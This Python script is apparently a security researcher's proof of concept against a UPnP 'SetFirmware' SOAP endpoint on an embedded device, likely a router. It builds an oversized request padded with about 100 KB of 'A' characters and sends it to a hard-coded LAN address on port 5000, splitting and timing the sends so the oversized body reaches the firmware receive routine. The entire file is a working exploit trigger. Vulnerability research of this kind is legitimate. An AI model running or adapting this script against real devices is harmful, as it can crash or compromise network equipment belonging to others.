#!/usr/bin/env python

# Copyright (c) 2015
# - Zachary Cutlip <uid000()gmail.com>
# 
# See LICENSE for more details.
# 

import socket
import time
from bowcaster.common import Logging


#HOST="10.12.34.1"
HOST="192.168.127.141"

class SetFirmwareRequestHeaders(object):
    def __init__(self,content_length):
        headers="".join(["POST /soap/server_sa/SetFirmware HTTP/1.1\r\n",
                             "Accept-Encoding: identity\r\n",
                             "Content-Length: %d\r\n",
                             "Soapaction: \"urn:DeviceConfig\"\r\n",
                             "Host: 127.0.0.1\r\n",
                             "User-Agent: Python-urllib/2.7\r\n",
                             "Connection: close\r\n",
                             "Content-Type: text/xml ;charset=\"utf-8\"\r\n\r\n"])
         
        self.headers=headers % (content_length)
        
    def __str__(self):
        return self.headers


class SetFirmwareRequest(object):
    """
    Generate a "SetFirmware" SOAP request
    
    Params
    ------
    logger: Optional. A Bowcaster Logging object. If a logger
            is not provided, one will be instantiated.
    """
    MIN_CONTENT_LENGTH=102401
    def __init__(self,logger=None):
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        
        self.request_body="A"*self.MIN_CONTENT_LENGTH
        
        length=len(self.request_body)
        logger.LOG_DEBUG("Length of request body is: %d" % length)
        
        self.request_headers=SetFirmwareRequestHeaders(length)
    
    def __str__(self):
        return str(self.request_headers)+self.request_body
        

def special_upnp_send(addr,port,data):
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((addr,port))
    
    """only send first 8190 bytes of request"""
    sock.send(data[:8190]) 
    
    """sleep to ensure first recv()
    only gets this first chunk."""
    time.sleep(1)
    
    """Hopefully in upnp_receiv_firmware_packets()
    by now, so we can send the rest."""
    sock.send(data[8190:])
    
    """
    Sleep a bit more so server doesn't end up
    in an infinite select() loop.
    Select's timeout is set to 1 sec,
    so we need to give enough time
    for the loop to go back to select,
    and for the timeout to happen,
    returning an error."""
    time.sleep(10)
    sock.close()


def main():
    logger=Logging(max_level=Logging.DEBUG)
    request=SetFirmwareRequest(logger=logger)
    
    #write out the request to a file so we can easily analyze what we sent.
    logger.LOG_DEBUG("Writing request to request.bin for analysis.")
    open("./request.bin","wb").write(str(request))
    logger.LOG_DEBUG("Done.")

    logger.LOG_INFO("Sending special UPnP request to host: %s" % HOST)
    special_upnp_send(HOST,5000,str(request))
    logger.LOG_INFO("Done.")

if __name__ == "__main__":
    main()

    
